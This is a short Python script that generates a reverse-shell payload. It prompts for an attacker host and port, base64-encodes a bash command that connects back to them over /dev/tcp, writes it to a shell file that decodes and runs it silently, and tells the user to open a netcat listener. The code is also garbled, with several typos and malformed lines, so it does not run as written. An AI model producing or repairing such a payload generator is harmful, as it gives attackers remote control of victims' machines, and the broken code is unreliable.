import os
import time
impor base64

time.sleep(0.5)
opt = input("LHOST: ")
opt2 = input("LPORT: ")
opt3 = input("name: ")
op = open(opt3 + ".sh", "w")
cod = base64.b64encode(b"bash -c '-i >& /dev/tcp/{}/{} >&1'".format(opt, opt2))
op1 op.write("echo " + cod + "| base64 -d | bash -c | bash 2>/dev/null")
op.close()
time.sleep(0.1)
print("WARNING: you need necat to connect using nc -lvnp <PORT>")
